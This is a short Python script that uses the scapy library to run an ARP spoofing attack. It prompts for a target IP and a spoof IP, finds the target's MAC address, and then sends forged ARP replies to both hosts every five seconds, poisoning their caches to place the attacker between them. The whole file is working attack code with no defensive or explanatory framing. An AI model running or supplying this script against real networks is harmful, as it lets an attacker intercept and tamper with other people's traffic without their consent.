import scapy.all as scapy
import time
import sys

def get_mac(ip):
    arp_packet = scapy.ARP(pdst=ip)
    broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_broadcast_packet = broadcast_packet / arp_packet
    answered_list = scapy.srp(arp_broadcast_packet, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

target = input("Enter Target IP: ")
spoof_ip = input("Enter Spoof IP: ")

try:
    while True:
        spoof(target, spoof_ip)
        spoof(spoof_ip, target)
        print("[+] Packets are sent...")
        time.sleep(5)

except KeyboardInterrupt:
    print("[-] Exiting...")
    sys.exit()
